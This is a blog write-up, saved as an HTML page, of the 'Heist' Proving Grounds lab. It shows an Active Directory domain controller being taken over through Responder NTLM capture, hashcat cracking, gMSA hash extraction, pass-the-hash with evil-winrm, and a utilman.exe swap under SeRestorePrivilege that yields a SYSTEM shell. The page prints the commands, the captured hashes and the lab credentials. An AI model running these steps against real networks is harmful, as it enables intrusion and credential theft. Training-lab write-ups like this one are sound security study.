@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Relearn 9.0.3+5fff5bc8a066e83e5f67f0de49c7dfb57379219e">
+    <meta name="description" content="Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Heist :: Dragonfly Commando">
+    <meta name="twitter:description" content="Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.">
+    <meta property="og:url" content="http://localhost:1313/writeup/proving-grounds/heist/index.html">
+    <meta property="og:site_name" content="Dragonfly Commando">
+    <meta property="og:title" content="Heist :: Dragonfly Commando">
+    <meta property="og:description" content="Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Writeup">
+    <meta property="article:published_time" content="2026-02-28T09:56:41+09:00">
+    <meta property="article:modified_time" content="2026-02-28T09:56:41+09:00">
+    <meta property="article:tag" content="SeRestorePrivilege">
+    <meta property="article:tag" content="Bloodhound">
+    <meta property="article:tag" content="ReadGMSAPassword">
+    <meta property="article:tag" content="Responder">
+    <meta property="article:tag" content="GMSApassword">
+    <meta property="article:tag" content="Utilman">
+    <meta itemprop="name" content="Heist :: Dragonfly Commando">
+    <meta itemprop="description" content="Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.">
+    <meta itemprop="datePublished" content="2026-02-28T09:56:41+09:00">
+    <meta itemprop="dateModified" content="2026-02-28T09:56:41+09:00">
+    <meta itemprop="wordCount" content="787">
+    <meta itemprop="keywords" content="SeRestorePrivilege,Bloodhound,ReadGMSAPassword,Responder,GMSApassword,Utilman">
+    <title>Heist :: Dragonfly Commando</title>
+    <link href="/images/favicon.png?1772243226" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1772243226" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1772243226" defer></script>
+    <script src="/js/search-lunr.js?1772243226" defer></script>
+    <script src="/js/search.js?1772243226" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1772243226";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1772243226" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1772243226" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1772243226" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1772243226" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1772243226" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1772243226" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1772243226" rel="stylesheet">
+    <link href="/css/theme.css?1772243226" rel="stylesheet">
+    <link href="/css/format-html.css?1772243226" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = ``;
+      window.relearn.path='\/writeup\/proving-grounds\/heist\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'auto' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support html" data-origin="/writeup/proving-grounds/heist/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#nmap-scan">NMAP scan</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#web">WEB</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#bloodhound">Bloodhound</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#abusing-serestoreprivilege">Abusing SeRestorePrivilege</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Dragonfly Commando</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/index.html"><span itemprop="name">Writeup</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/proving-grounds/index.html"><span itemprop="name">Proving Grounds</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Heist</span><meta itemprop="position" content="4"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/index.html" title="Proving Grounds (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/vault/index.html" title="Vault (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable writeup" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+<div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/tags/bloodhound/index.html">Bloodhound</a></li>
+    <li><a class="term-link" href="/tags/gmsapassword/index.html">GMSApassword</a></li>
+    <li><a class="term-link" href="/tags/readgmsapassword/index.html">ReadGMSAPassword</a></li>
+    <li><a class="term-link" href="/tags/responder/index.html">Responder</a></li>
+    <li><a class="term-link" href="/tags/serestoreprivilege/index.html">SeRestorePrivilege</a></li>
+    <li><a class="term-link" href="/tags/utilman/index.html">Utilman</a></li>
+  </ul>
+</div>
+  </header>
+
+<h1 id="heist">Heist</h1>
+
+<h1 id="initial-foothold">initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="nmap-scan">NMAP scan<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-02-25 04:52:37Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: heist.offsec0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: heist.offsec0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-02-25T04:54:11+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.heist.offsec
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-02-24T04:50:12
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-08-26T04:50:12
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: HEIST
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: HEIST
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: DC01
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: heist.offsec
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: DC01.heist.offsec
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: heist.offsec
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2026-02-25T04:53:31+00:00
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>8080/tcp  open  http          Werkzeug httpd 2.0.1 <span style="color:#f92672">(</span>Python 3.9.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
+</span></span><span style="display:flex;"><span>|_http-title: Super Secure Web Browser
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49674/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49704/tcp open  msrpc         Microsoft Windows RPC</span></span></code></pre></div>
+<p>From the scan results, we can see that this machine is a Domain Controller. Several Active Directory–related services are exposed, including LDAP (389), Kerberos (88), SMB (445), and Global Catalog (3268).</p>
+<p>One interesting service is running on port 8080, which appears to be a web application powered by Flask.</p>
+<h1 id="enumeration">enumeration<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="web">WEB<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>The web page contains a URL input field. To test whether the application makes outbound connections, I entered my own IP address and monitored for incoming traffic.</p>
+<p><a href="#R-image-e11e214770a7403b4cd8d1a1260709d3" class="lightbox-link"><img alt="url-input" class="lazy lightbox figure-image" loading="lazy" src="/images/heist/heist-web.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e11e214770a7403b4cd8d1a1260709d3"><img alt="url-input" class="lazy lightbox lightbox-image" loading="lazy" src="/images/heist/heist-web.png"></a></p>
+<p>Using Responder, I was able to capture NTLM authentication from the user enox.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>HTTP<span style="color:#f92672">]</span> NTLMv2 Client   : 192.168.115.165
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>HTTP<span style="color:#f92672">]</span> NTLMv2 Username : HEIST<span style="color:#ae81ff">\e</span>nox
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>HTTP<span style="color:#f92672">]</span> NTLMv2 Hash     : enox::HEIST:dff6ac54f806b386:84663E057CEEF7EE058596D9C2B8B826:01010000000000006AD8221114A6DC0110A62938E9D3D95400000000020008004C00330039005A0001001E00570049004E002D00410049003300390056003600390033004A0043003200040014004C00330039005A002E004C004F00430041004C0003003400570049004E002D00410049003300390056003600390033004A00430032002E004C00330039005A002E004C004F00430041004C00050014004C00330039005A002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003200340037000000000000000000</span></span></code></pre></div>
+<p>Cracked the hash using hashcat:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code class="language-hash" data-lang="hash">hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt</code></pre></div>
+<p>Credentials recovered: <code>enox / california </code></p>
+<h1 id="lateral-movement">lateral movement<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>I used evil-winrm to log in.</p>
+<p>On the Desktop, I found a file named <strong>todo.txt</strong>:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\enox\desktop&gt; cat todo.txt
+</span></span><span style="display:flex;"><span>- Setup Flask Application <span style="color:#66d9ef">for</span> Secure Browser [<span style="color:#66d9ef">DONE</span>]
+</span></span><span style="display:flex;"><span>- Use group managed service account <span style="color:#66d9ef">for</span> apache [<span style="color:#66d9ef">DONE</span>]
+</span></span><span style="display:flex;"><span>- Migrate to apache
+</span></span><span style="display:flex;"><span>- Debug Flask Application [<span style="color:#66d9ef">DONE</span>]
+</span></span><span style="display:flex;"><span>- Remove Flask Application
+</span></span><span style="display:flex;"><span>- Submit IT Expenses file to admin. [<span style="color:#66d9ef">DONE</span>]</span></span></code></pre></div>
+<p>This suggests that Apache is configured to use a <em>Group Managed Service Account (gMSA)</em>.</p>
+<p>Looking in C:\Users, I found a service account:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>    Directory: C:\users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----        7/20/2021   4:25 AM                Administrator
+</span></span><span style="display:flex;"><span>d-----        2/24/2026  11:50 PM                enox
+</span></span><span style="display:flex;"><span>d-r---        5/28/2021   3:53 AM                Public
+</span></span><span style="display:flex;"><span>d-----        9/14/2021   8:27 AM                svc_apache$</span></span></code></pre></div>
+<p>Service accounts often have elevated privileges, making this a promising target.</p>
+<h2 id="bloodhound">Bloodhound<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>I ran BloodHound to analyze privilege escalation paths.</p>
+<p><a href="#R-image-e1f9b8bb377677fb91c6307c79220862" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/heist/heist-webadmin.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e1f9b8bb377677fb91c6307c79220862"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/heist/heist-webadmin.png"></a></p>
+<p>BloodHound revealed that the user enox has the <strong>ReadGMSAPassword</strong> permission over svc_apache$.</p>
+<p>This means we can retrieve the managed password for that account.</p>
+<p>Using gmsapasswordreader.exe, I extracted the password hashes:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>gmsapasswordreader.exe --accountname svc_apache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Calculating hashes for Old Value
+</span></span><span style="display:flex;"><span>[*] Input username             : svc_apache$
+</span></span><span style="display:flex;"><span>[*] Input domain               : HEIST.OFFSEC
+</span></span><span style="display:flex;"><span>[*] Salt                       : HEIST.OFFSECsvc_apache$
+</span></span><span style="display:flex;"><span>[*]       rc4_hmac             : 555E082FC42C2D7DB6DCE1AE1960A122
+</span></span><span style="display:flex;"><span>[*]       aes128_cts_hmac_sha1 : 91BDC8AA9BBA3A281B94460823E3723B
+</span></span><span style="display:flex;"><span>[*]       aes256_cts_hmac_sha1 : 3904CE07CB1DEED14713BA71A0D1956DE03FF0DDC4EE9185AAC4D0653616764E
+</span></span><span style="display:flex;"><span>[*]       des_cbc_md5          : 2F0B768CE6EFC419
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Calculating hashes for Current Value
+</span></span><span style="display:flex;"><span>[*] Input username             : svc_apache$
+</span></span><span style="display:flex;"><span>[*] Input domain               : HEIST.OFFSEC
+</span></span><span style="display:flex;"><span>[*] Salt                       : HEIST.OFFSECsvc_apache$
+</span></span><span style="display:flex;"><span>[*]       rc4_hmac             : B4A3125F0CB30FCBB499D4B4EB1C20D2
+</span></span><span style="display:flex;"><span>[*]       aes128_cts_hmac_sha1 : 51943C933F7A24126B1C43883866DDB4
+</span></span><span style="display:flex;"><span>[*]       aes256_cts_hmac_sha1 : 003367B7C9B89B1717838E9CE2B79C0CD458326E32870F73EC94AF810F4A7E32
+</span></span><span style="display:flex;"><span>[*]       des_cbc_md5          : 45C4D9732C9D1FD5</span></span></code></pre></div>
+<p>Using Pass-the-Hash:</p>
+<p><code>evil-winrm -i 192.168.115.165 -u svc_apache$ -H B4A3125F0CB30FCBB499D4B4EB1C20D2</code></p>
+
+<details open class="box cstyle notices warning">
+  <summary class="box-label" tabindex="-1">
+    <i class="fa-fw fas fa-exclamation-triangle"></i> 
+    Do not forget the <!-- raw HTML omitted -->$<!-- raw HTML omitted --> at the end of the username.
+  </summary>
+  <div class="box-content">
+<p>Authentication will fail without it.</p>
+  </div>
+</details>
+<h1 id="privilege-escalation">privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>Checking privileges:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre></div>
+<p>I confrimed the user has <em>SeRestorePrivilege</em>.</p>
+<p>This privilege allows restoring files and directories, which can be abused to overwrite protected system files.</p>
+<p>In the Documents folder, I found a PowerShell script referencing:</p>
+<p><a href="#R-image-78cffa8014d3c09a2ba46c9168f8596c" class="lightbox-link"><img alt="powershell_script" class="lazy lightbox figure-image" loading="lazy" src="images/heist/heist-serestore.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-78cffa8014d3c09a2ba46c9168f8596c"><img alt="powershell_script" class="lazy lightbox lightbox-image" loading="lazy" src="images/heist/heist-serestore.png"></a></p>
+<p>It&rsquo;s telling us to check the <a href="https://github.com/gtworek/Priv2Admin" rel="external">github</a> for privsec.</p>
+<h2 id="abusing-serestoreprivilege">Abusing SeRestorePrivilege<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>According to the guidance:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>1. Launch PowerShell/ISE with the SeRestore privilege present.
+2. Enable the privilege with Enable-SeRestorePrivilege.
+3. Rename utilman.exe to utilman.old
+4. Rename cmd.exe to utilman.exe
+5. Lock the console and press Win+U</code></pre></div>
+<p>Okay, according to the note, we will replace utilman.exe file to cmd.exe file.</p>
+<p>Then by interacting with GUI somehow, the cmd.exe will be executed instead of utilman.exe which is suppposed to.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.exe.bak
+</span></span><span style="display:flex;"><span>mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</span></span></code></pre></div>
+<p>Then I opened remote desktop to interact.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rdesktop 192.168.115.165</span></span></code></pre></div>
+<p><a href="#R-image-eb3c7eac298c96a1466145f372c45abd" class="lightbox-link"><img alt="windows" class="lazy lightbox figure-image" loading="lazy" src="/images/heist/heist-rdesktop.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-eb3c7eac298c96a1466145f372c45abd"><img alt="windows" class="lazy lightbox lightbox-image" loading="lazy" src="/images/heist/heist-rdesktop.png"></a></p>
+<p>From the login screen, clicking the Ease of Access (Utility Manager) icon launches utilman.exe.</p>
+<p>Since we replaced it with cmd.exe, a SYSTEM shell is spawned.</p>
+<p><a href="#R-image-9ce659075b53233b854571579e09f8f5" class="lightbox-link"><img alt="cmd" class="lazy lightbox figure-image" loading="lazy" src="/images/heist/heist-systemshell.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-9ce659075b53233b854571579e09f8f5"><img alt="cmd" class="lazy lightbox lightbox-image" loading="lazy" src="/images/heist/heist-systemshell.png"></a></p>
+<p>We now have full SYSTEM access on the Domain Controller!</p>
+
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> Feb 28, 2026
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <a id="R-logo" class="R-default direction-row" href="/index.html">
+          <span class="logo-title default-animation">Dragonfly Commando</span>
+        </a>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-fw fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-fw fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+      </div>
+      <div id="R-homelinks" class="default-animation homelinks">
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-homelinks default-animation">
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-headercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
+          <ul class="enlarge morespace collapsible-menu">
+            <li class="" data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html">Posts</a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu"></ul></li>
+            <li class="parent " data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html">Writeup</a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu">
+            <li class="parent alwaysopen " data-nav-id="/writeup/proving-grounds/index.html"><a class="padding default-animation" href="/writeup/proving-grounds/index.html">Proving Grounds</a><ul id="R-subsections-5c44e917da5921333a506ba619b792ee" class="collapsible-menu">
+            <li class="active " data-nav-id="/writeup/proving-grounds/heist/index.html"><a class="padding" href="/writeup/proving-grounds/heist/index.html">Heist</a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/vault/index.html"><a class="padding" href="/writeup/proving-grounds/vault/index.html">Vault</a></li>
